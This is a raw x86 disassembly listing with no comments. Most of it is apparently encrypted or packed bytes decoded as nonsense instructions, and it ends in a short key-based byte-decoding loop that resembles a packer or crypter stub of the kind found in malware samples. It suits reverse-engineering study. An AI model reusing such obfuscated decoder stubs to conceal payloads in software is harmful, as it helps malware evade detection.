  417b3b:	or     DWORD PTR [ecx],edx
  417b3d:	not    DWORD PTR [bx+si+0x1d0b]
  417b42:	add    BYTE PTR [ecx],dl
  417b44:	(bad)  [ecx+0x10]
  417b47:	dec    ecx
  417b48:	sbb    dh,0xc6
  417b4b:	cmp    eax,0x1de58d7b
  417b50:	mov    ds:0x8fb4e4d1,al
  417b55:	fiadd  DWORD PTR [edx-0x45f964b4]
  417b5b:	imul   ebp,DWORD PTR [ebx+0x27c239e8],0x74
  417b62:	inc    edi
  417b63:	lods   eax,DWORD PTR ds:[esi]
  417b64:	ja     0x417ae9
  417b66:	jmp    0x5464c5d6
  417b6b:	xchg   ecx,eax
  417b6c:	adc    esp,DWORD PTR [ebx+ecx*2]
  417b6f:	sbb    BYTE PTR [edi],dl
  417b71:	push   esi
  417b72:	adc    edx,ecx
  417b74:	push   ebp
  417b75:	clc    
  417b76:	rcl    DWORD PTR ds:0x822b71e9,1
  417b7c:	out    0x81,eax
  417b7e:	xchg   esp,eax
  417b7f:	xor    ebp,eax
  417b81:	adc    DWORD PTR [edx-0x77],edx
  417b84:	sbb    bh,BYTE PTR [ebx+0x24]
  417b87:	in     al,dx
  417b88:	xchg   esi,eax
  417b89:	mov    DWORD PTR [edx-0x52],ebp
  417b8c:	add    cl,al
  417b8e:	mov    eax,0xd03a989
  417b93:	xchg   edi,eax
  417b94:	and    ecx,ecx
  417b96:	jo     0x417b82
  417b98:	gs dec ebp
  417b9a:	and    BYTE PTR [eax+0x50ec969e],cl
  417ba0:	neg    DWORD PTR ds:0x24b2f02a
  417ba7:	sar    BYTE PTR [esp+eiz*4+0x3b],0xa1
  417bac:	rol    dh,cl
  417bae:	(bad)  
  417baf:	xlat   BYTE PTR ds:[ebx]
  417bb0:	fsub   DWORD PTR [esi+eiz*4-0xa]
  417bb4:	cmp    al,0xde
  417bb6:	call   0x4aa5:0x8cb98587
  417bbd:	adc    ebp,eax
  417bbf:	adc    al,0x6
  417bc1:	into   
  417bc2:	out    0x67,eax
  417bc4:	bnd jno 0x417bfa
  417bc7:	sub    ch,BYTE PTR [esi-0x1035ddfe]
  417bcd:	push   eax
  417bce:	inc    esp
  417bcf:	jle    0x417bff
  417bd1:	fs xchg esi,eax
  417bd3:	cmp    cl,BYTE PTR ds:0xb450989b
  417bd9:	sub    eax,0x953a700b
  417bde:	call   0x3c9d400e
  417be3:	fmul   st(5),st
  417be5:	mov    eax,0xbfd3c548
  417bea:	sub    eax,0x3b3aea9f
  417bef:	mov    edx,0x9e194aea
  417bf5:	loopne 0x417b77
  417bf7:	outs   dx,BYTE PTR ds:[esi]
  417bf8:	mov    bl,0x76
  417bfa:	bound  esi,QWORD PTR [esi-0xf16552f]
  417c00:	lea    ebx,[edi+0x66]
  417c03:	mov    ebx,0x7b9f4bd4
  417c08:	pop    ebp
  417c09:	inc    eax
  417c0a:	jne    0x417c63
  417c0c:	shr    BYTE PTR [esi+ebx*2],cl
  417c0f:	ret    0x9dc8
  417c12:	jb     0x417c81
  417c14:	sti    
  417c15:	mov    ds:0xcf56d779,eax
  417c1a:	and    eax,eax
  417c1c:	std    
  417c1d:	fsub   DWORD PTR ds:0xb03a3942
  417c23:	ror    DWORD PTR [ebx+0x5cd16b96],cl
  417c29:	inc    ebx
  417c2a:	or     eax,0xbc5805a7
  417c2f:	jmp    0x87a1d8f2
  417c34:	cwde   
  417c35:	push   ebp
  417c36:	cmp    eax,DWORD PTR [edi-0x16]
  417c39:	sbb    ebp,edi
  417c3b:	or     eax,0xce405b88
  417c40:	clc    
  417c41:	es adc eax,0xec6a7c14
  417c47:	out    dx,eax
  417c48:	pusha  
  417c49:	cmc    
  417c4a:	mov    dh,0x98
  417c4c:	outs   dx,BYTE PTR ds:[esi]
  417c4d:	and    bl,BYTE PTR [ebx-0x3d7df65a]
  417c53:	or     bl,cl
  417c55:	(bad)  
  417c56:	imul   edi
  417c58:	(bad)
  417c5c:	shl    BYTE PTR [eax-0x5f],0xb6
  417c60:	pushf  
  417c61:	outs   dx,BYTE PTR ds:[esi]
  417c62:	in     eax,0xde
  417c64:	out    0xe0,eax
  417c66:	es mov ch,0x41
  417c69:	out    0xcd,eax
  417c6b:	stos   BYTE PTR es:[edi],al
  417c6c:	mov    esp,0xf07e2c66
  417c71:	adc    esp,DWORD PTR [edi-0x64]
  417c74:	adc    eax,DWORD PTR [ecx-0x3b]
  417c77:	les    eax,FWORD PTR [edx-0x2ba1d466]
  417c7d:	(bad)
  417c80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c81:	mov    bl,0x5d
  417c83:	mov    ds:0xe0574cad,al
  417c88:	pop    es
  417c89:	sahf   
  417c8a:	repnz or edi,DWORD PTR [eax+0x1398f61e]
  417c91:	retf   0xc7d5
  417c94:	dec    edi
  417c95:	push   cs
  417c96:	add    ebp,DWORD PTR [ebp+0x67b419f9]
  417c9c:	push   edx
  417c9d:	mov    al,ds:0xa23a9804
  417ca2:	ret    0x7145
  417ca5:	outs   dx,BYTE PTR ds:[esi]
  417ca6:	sbb    ebp,esp
  417ca8:	imul   edx,DWORD PTR [ebx-0x5a],0x6d2b0cf6
  417caf:	in     eax,dx
  417cb0:	and    eax,0xe50ba470
  417cb5:	xor    BYTE PTR [edx-0x35fa1629],dh
  417cbb:	outs   dx,DWORD PTR ds:[esi]
  417cbc:	lods   eax,DWORD PTR ds:[esi]
  417cbd:	mov    BYTE PTR [ecx+0x2e759fbb],bl
  417cc3:	inc    edi
  417cc4:	xchg   esp,eax
  417cc5:	mov    ecx,0xfa697031
  417cca:	(bad)  
  417ccb:	mov    dh,0xb8
  417ccd:	aam    0x2b
  417ccf:	dec    esp
  417cd0:	adc    esp,ecx
  417cd2:	xchg   BYTE PTR [ecx+0x2],bl
  417cd5:	mov    WORD PTR [ecx-0x18],ds
  417cd8:	jns    0x417cf3
  417cda:	out    0xc3,eax
  417cdc:	test   DWORD PTR [edx-0x7a],0xca8a796f
  417ce3:	jle    0x417d17
  417ce5:	fisub  DWORD PTR [eax+ebx*8-0x393156bc]
  417cec:	hlt    
  417ced:	inc    ebx
  417cee:	mov    cl,0x10
  417cf0:	or     eax,0x807bd27c
  417cf5:	aad    0xa5
  417cf7:	push   edx
  417cf8:	jp     0x417d75
  417cfa:	aas    
  417cfb:	mov    eax,ds:0x167a806d
  417d00:	mov    edi,0xf1d4c90
  417d05:	(bad)  
  417d06:	lahf   
  417d07:	add    eax,0xda8764cc
  417d0c:	je     0x417c9e
  417d0e:	push   eax
  417d0f:	sub    edi,ebx
  417d11:	test   ebp,ebp
  417d13:	or     eax,0x24970628
  417d18:	imul   ecx,DWORD PTR [ebp-0x88ab4ba],0xd01468b0
  417d22:	lods   al,BYTE PTR ds:[esi]
  417d23:	popa   
  417d24:	cmp    eax,0x95ac9858
  417d29:	scas   al,BYTE PTR es:[edi]
  417d2a:	or     DWORD PTR [esi+0x75],esp
  417d2d:	cmp    al,ch
  417d2f:	ds (bad) 
  417d32:	pushf  
  417d33:	sub    al,0xb0
  417d35:	or     eax,0x71351960
  417d3a:	mov    BYTE PTR [esp+edi*2+0x20],cl
  417d3e:	rcr    dh,1
  417d40:	hlt    
  417d41:	or     DWORD PTR [ebx-0xd135f67],0xffffffda
  417d48:	push   edi
  417d49:	inc    ecx
  417d4a:	fcmovne st,st(6)
  417d4c:	mov    al,0x83
  417d4e:	jns    0x417d58
  417d50:	mov    eax,0x811bad7f
  417d55:	adc    eax,0x704f6ac
  417d5a:	outs   dx,BYTE PTR ds:[esi]
  417d5b:	jbe    0x417d87
  417d5d:	push   0xffffffa5
  417d5f:	jecxz  0x417d9f
  417d61:	mov    eax,ds:0x2b2a42e9
  417d66:	(bad)  
  417d67:	jno    0x417d02
  417d69:	scas   eax,DWORD PTR es:[edi]
  417d6a:	lock mov esp,0xb2e92cd
  417d71:	jle    0x417dca
  417d73:	pop    esi
  417d74:	(bad)  
  417d76:	sahf   
  417d77:	icebp  
  417d78:	and    eax,0xe96975df
  417d7d:	(bad)  
  417d7e:	enter  0x9ff3,0x38
  417d82:	push   edi
  417d83:	ja     0x417d1e
  417d85:	imul   edi,esp,0xffffff94
  417d88:	cmp    al,0x21
  417d8a:	mov    esi,0x5bffaee8
  417d8f:	push   edx
  417d90:	cwde   
  417d91:	(bad)  
  417d92:	dec    ecx
  417d93:	jp     0x417d5e
  417d95:	mov    ebx,0x454de1be
  417d9a:	mov    ebx,DWORD PTR [edi]
  417d9c:	std    
  417d9d:	push   ecx
  417d9e:	dec    esp
  417d9f:	out    0x17,eax
  417da1:	sub    dl,0x5a
  417da4:	mov    es,WORD PTR [eax]
  417da6:	and    al,0xe6
  417da8:	(bad)  
  417da9:	stc    
  417daa:	cmp    DWORD PTR [edx-0x26],edx
  417dad:	push   edx
  417dae:	sti    
  417daf:	jp     0x417d32
  417db1:	add    eax,0xaa4c0814
  417db6:	out    0x87,eax
  417db8:	or     eax,0x5b9634a9
  417dbd:	out    0xcd,al
  417dbf:	pop    esi
  417dc0:	and    eax,0x9c19031f
  417dc6:	outs   dx,BYTE PTR ds:[esi]
  417dc7:	sbb    edx,ecx
  417dc9:	outs   dx,BYTE PTR ds:[esi]
  417dca:	cwde   
  417dcb:	inc    edx
  417dcc:	push   es
  417dcd:	inc    BYTE PTR [edx+0x10]
  417dd0:	mov    ebx,0x1b1db2cb
  417dd5:	add    eax,0xf80a970a
  417dda:	jo     0x417d77
  417ddc:	sub    dl,BYTE PTR [edx-0x6]
  417ddf:	lods   al,BYTE PTR ds:[esi]
  417de0:	sbb    ebp,ebp
  417de2:	bound  eax,QWORD PTR [ebx+0x2fecb607]
  417de8:	lods   al,BYTE PTR ds:[esi]
  417de9:	das    
  417dea:	aas    
  417deb:	jae    0x417da2
  417ded:	(bad)  
  417dee:	mov    edi,0x762ac4a2
  417df3:	call   DWORD PTR [eax+0x79]
  417df6:	push   edx
  417df7:	(bad)  
  417df9:	std    
  417dfa:	mov    al,ds:0xcd217c35
  417dff:	jge    0x417e7b
  417e01:	push   ebx
  417e02:	pop    esp
  417e03:	mov    DWORD PTR [ebx-0x2900038b],ecx
  417e09:	mov    DWORD PTR [ebp-0x3c],eax
  417e0c:	cmp    DWORD PTR [ebp-0x3c],0x57
  417e10:	jne    0x417e1e
  417e12:	mov    edx,DWORD PTR [ebp-0x24]
  417e15:	push   edx
  417e16:	call   0x401000
  417e1b:	add    esp,0x4
  417e1e:	xor    eax,eax
  417e20:	pop    esi
  417e21:	mov    esp,ebp
  417e23:	pop    ebp
  417e24:	ret    
  417e25:	push   ebp
  417e26:	mov    ebp,esp
  417e28:	sub    esp,0x124
  417e2e:	xor    eax,eax
  417e30:	mov    esp,ebp
  417e32:	pop    ebp
  417e33:	ret    
  417e34:	push   ebp
  417e35:	mov    ebp,esp
  417e37:	sub    esp,0x2c
  417e3a:	push   ebx
  417e3b:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  417e42:	mov    DWORD PTR [ebp-0xc],0x0
  417e49:	mov    DWORD PTR [ebp-0x20],0x1
  417e50:	mov    DWORD PTR [ebp-0x10],0x0
  417e57:	mov    eax,DWORD PTR [ebp+0xc]
  417e5a:	mov    DWORD PTR [ebp-0x1c],eax
  417e5d:	mov    DWORD PTR [ebp-0x18],0x0
  417e64:	mov    DWORD PTR [ebp-0x8],0x0
  417e6b:	mov    DWORD PTR [ebp-0x24],0x0
  417e72:	mov    ecx,DWORD PTR [ebp-0x4]
  417e75:	sub    ecx,0x1
  417e78:	mov    DWORD PTR [ebp-0x4],ecx
  417e7b:	mov    edx,DWORD PTR [ebp+0x8]
  417e7e:	mov    DWORD PTR [ebp-0x10],edx
  417e81:	mov    DWORD PTR [ebp-0x28],0x1
  417e88:	mov    eax,DWORD PTR [ebp-0x4]
  417e8b:	add    eax,0x2
  417e8e:	mov    DWORD PTR [ebp-0x4],eax
  417e91:	mov    ecx,DWORD PTR [ebp-0x1c]
  417e94:	add    ecx,DWORD PTR [ebp-0x4]
  417e97:	mov    dl,BYTE PTR [ecx+0x1]
  417e9a:	mov    BYTE PTR [ebp-0x11],dl
  417e9d:	mov    eax,DWORD PTR [ebp-0x4]
  417ea0:	add    eax,0x1
  417ea3:	mov    DWORD PTR [ebp-0x4],eax
  417ea6:	mov    cl,BYTE PTR [ebp-0x11]
  417ea9:	mov    BYTE PTR [ebp-0x29],cl
  417eac:	push   edx
  417ead:	pop    ebx
  417eae:	mov    ecx,ebx
  417eb0:	mov    edx,DWORD PTR [ebp-0x10]
  417eb3:	add    edx,DWORD PTR [ebp-0x4]
  417eb6:	mov    al,BYTE PTR [ebp-0x29]
  417eb9:	mov    BYTE PTR [edx],al
  417ebb:	mov    ebx,esi
  417ebd:	mov    ecx,DWORD PTR [ebp+0x14]
  417ec0:	add    ecx,DWORD PTR [ebp-0x8]
  417ec3:	movzx  edx,BYTE PTR [ecx]
  417ec6:	mov    DWORD PTR [ebp-0xc],edx
  417ec9:	mov    eax,DWORD PTR [ebp-0x8]
  417ecc:	mov    ecx,DWORD PTR [ebp-0x28]
  417ecf:	add    eax,ecx
  417ed1:	mov    DWORD PTR [ebp-0x8],eax
  417ed4:	mov    eax,DWORD PTR [ebp-0x8]
  417ed7:	shr    eax,0x3
  417eda:	mov    ecx,0x1
  417edf:	sub    ecx,eax
  417ee1:	mov    DWORD PTR [ebp-0x20],ecx
  417ee4:	shr    eax,cl
  417ee6:	mov    edx,DWORD PTR [ebp-0x8]
  417ee9:	imul   edx,DWORD PTR [ebp-0x20]
  417eed:	mov    DWORD PTR [ebp-0x8],edx
  417ef0:	shl    ebx,0x3
  417ef3:	mov    eax,DWORD PTR [ebp-0x10]
  417ef6:	add    eax,DWORD PTR [ebp-0x4]
  417ef9:	movzx  ecx,BYTE PTR [eax]
  417efc:	add    ecx,DWORD PTR [ebp-0xc]
  417eff:	mov    edx,DWORD PTR [ebp-0x10]
  417f02:	add    edx,DWORD PTR [ebp-0x4]
  417f05:	mov    BYTE PTR [edx],cl
  417f07:	mov    eax,DWORD PTR [ebp-0x4]
  417f0a:	sub    eax,0x2
  417f0d:	mov    DWORD PTR [ebp-0x4],eax
  417f10:	mov    ecx,DWORD PTR [ebp-0x4]
  417f13:	cmp    ecx,DWORD PTR [ebp+0x10]
  417f16:	jl     0x417e88
  417f1c:	pop    ebx
  417f1d:	mov    esp,ebp
  417f1f:	pop    ebp
  417f20:	ret    
  417f21:	int3   
  417f22:	jmp    DWORD PTR ds:0x418008
